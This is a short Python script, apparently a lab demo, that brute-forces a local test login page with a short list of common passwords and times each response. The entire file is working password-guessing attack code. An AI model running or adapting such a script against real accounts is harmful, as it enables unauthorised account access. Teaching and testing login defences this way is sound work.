import requests
import time

url = "http://localhost:5000/login"

email = "miguel@example.com"

passwords = [
    "123456",
    "password",
    "admin123",
    "Password123",  # correct password
    "qwerty",
    "letmein"
]

print("Starting brute-force attack...\n")

for pwd in passwords:
    start = time.time()

    response = requests.post(url, json={
        "email": email,
        "password": pwd
    })

    end = time.time()
    elapsed = end - start

    try:
        data = response.json()
        message = data.get("message", "")
    except:
        message = "No response"

    print(f"Trying: {pwd}")
    print(f"Time: {elapsed:.3f} seconds")
    print(f"Response: {message}")
    print("-" * 40)